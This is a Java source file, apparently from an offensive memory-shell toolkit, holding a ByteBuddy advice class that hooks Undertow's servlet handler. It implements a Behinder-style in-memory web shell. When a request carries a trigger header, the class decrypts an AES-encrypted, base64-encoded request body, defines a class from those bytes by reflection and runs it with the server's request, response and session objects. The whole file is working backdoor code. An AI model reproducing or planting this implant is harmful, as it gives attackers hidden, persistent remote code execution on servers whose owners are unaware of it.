package com.reajason.javaweb.memshell.shelltool.behinder.undertow;

import net.bytebuddy.asm.Advice;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 */
public class BehinderServletInitialHandlerAdvisor {

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.AllArguments Object[] args
    ) {
        String pass = "pass";
        String headerName = "headerName";
        String headerValue = "headerValue";
        try {
            Object servletRequestContext = null;
            if (args.length == 2) {
                servletRequestContext = args[1];
            } else {
                servletRequestContext = args[2];
            }
            Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
            Object res = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null
                    && value.contains(headerValue)) {
                Map<String, Object> obj = new HashMap<String, Object>(3);
                obj.put("request", request);
                Object response = res;
                Field field = null;
                Class<?> clazz = obj.getClass();
                while (clazz != Object.class) {
                    try {
                        field = clazz.getDeclaredField("response");
                        break;
                    } catch (NoSuchFieldException var5) {
                        clazz = clazz.getSuperclass();
                    }
                }
                if (field != null) {
                    field.setAccessible(true);
                    response = field.get(response);
                }
                obj.put("response", response);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "u", pass);
                obj.put("session", session);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(pass.getBytes(), "AES"));
                byte[] data = null;
                Class<?> base64;
                BufferedReader reader = (BufferedReader) request.getClass().getMethod("getReader").invoke(request);
                String parameter = reader.readLine();
                try {
                    base64 = Class.forName("java.util.Base64");
                    Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
                    data = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, parameter);
                } catch (Exception var6) {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    data = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, parameter);
                }
                byte[] bytes = c.doFinal(data);
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytes, 0, bytes.length);
                Object instance = payload.newInstance();
                instance.equals(obj);
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}